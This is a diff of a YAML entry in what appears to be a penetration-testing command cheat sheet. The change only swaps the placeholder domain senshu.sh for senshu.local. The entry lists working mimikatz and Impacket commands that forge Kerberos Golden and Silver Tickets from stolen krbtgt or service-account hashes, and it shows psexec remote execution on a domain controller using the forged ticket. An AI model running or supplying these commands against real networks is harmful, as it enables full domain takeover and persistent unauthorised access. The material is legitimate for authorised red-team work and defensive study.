@@ -5,18 +5,18 @@ commands:
   - have: Hash
     cmd: |
       # Golden Ticket — mimikatz (requires krbtgt NTLM hash)
-      mimikatz.exe "kerberos::golden /user:Administrator /domain:senshu.sh /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /krbtgt:NTHASH /ptt"
+      mimikatz.exe "kerberos::golden /user:Administrator /domain:senshu.local /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /krbtgt:NTHASH /ptt"
 
       # Golden Ticket — Impacket ticketer
-      impacket-ticketer -nthash NTHASH -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX -domain senshu.sh Administrator
+      impacket-ticketer -nthash NTHASH -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX -domain senshu.local Administrator
       export KRB5CCNAME=Administrator.ccache
-      impacket-psexec senshu.sh/Administrator@DC.senshu.sh -k -no-pass
+      impacket-psexec senshu.local/Administrator@DC.senshu.local -k -no-pass
 
       # Silver Ticket — mimikatz (requires service account NTLM hash)
-      mimikatz.exe "kerberos::golden /user:Administrator /domain:senshu.sh /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /target:DC.senshu.sh /service:cifs /rc4:NTHASH /ptt"
+      mimikatz.exe "kerberos::golden /user:Administrator /domain:senshu.local /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /target:DC.senshu.local /service:cifs /rc4:NTHASH /ptt"
 
       # Silver Ticket — Impacket ticketer
-      impacket-ticketer -nthash NTHASH -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX -domain senshu.sh -spn cifs/DC.senshu.sh Administrator
+      impacket-ticketer -nthash NTHASH -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX -domain senshu.local -spn cifs/DC.senshu.local Administrator
 
       # Note: Golden Ticket = krbtgt hash → full domain compromise
       # Note: Silver Ticket = service account hash → access to that specific service only
